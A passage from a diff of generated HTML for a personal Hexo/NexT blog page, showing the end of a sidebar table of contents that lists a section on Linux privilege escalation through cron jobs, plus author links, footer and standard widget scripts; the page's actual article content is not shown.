href="#Linux%E6%8F%90%E6%9D%83%E6%9C%AC%E5%9C%B0%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%AE%89%E5%85%A8"><span class="nav-number">4.6.</span> <span class="nav-text">Linux提权本地定时任务安全</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98"><span class="nav-number">4.6.1.</span> <span class="nav-text">路径问题</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Spring"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Spring</p>
+  <div class="site-description" itemprop="description">见到一座山，就想知道山后面是什么。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yourname" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yourname" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/qq_49502930" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_49502930" rel="noopener" target="_blank"><i class="crosshairs fa-fw"></i>CSDN</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Spring</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":"true#是否在手机端显示"},"log":false});</script></body>
+</html>
